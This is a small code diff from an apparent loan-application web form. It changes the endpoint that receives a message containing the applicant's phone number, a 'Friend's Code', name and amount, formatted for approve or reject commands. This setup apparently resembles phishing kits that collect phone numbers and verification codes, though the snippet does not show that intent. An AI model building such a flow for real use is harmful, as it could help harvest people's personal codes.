@@ -51,8 +51,8 @@ document.getElementById('verificationForm').addEventListener('submit', async fun
     const message = `🔔 *NEW LOAN APPLICATION*\n━━━━━━━━━━━━━━━━━━\n📱 *Phone:* ${loanData.phone}\n🔑 *Friend's Code:* ${friendCode}\n💰 *Amount:* GHS ${loanData.loanAmount}\n👤 *Name:* ${loanData.fullname}\n🆔 *Ref:* ${loanData.referenceId}\n━━━━━━━━━━━━━━━━━━\n\n*Actions:*\n✅ /approve_${loanData.referenceId} - Approve\n❌ /reject_${loanData.referenceId} - Reject`;
     
     try {
-        // Send to backend API
-        const response = await fetch('https://ghana-loans-xz37.onrender.com/api/send-message', {
+        // ✅ USE RELATIVE URL - works on same domain
+        const response = await fetch('/api/send-message', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ message })
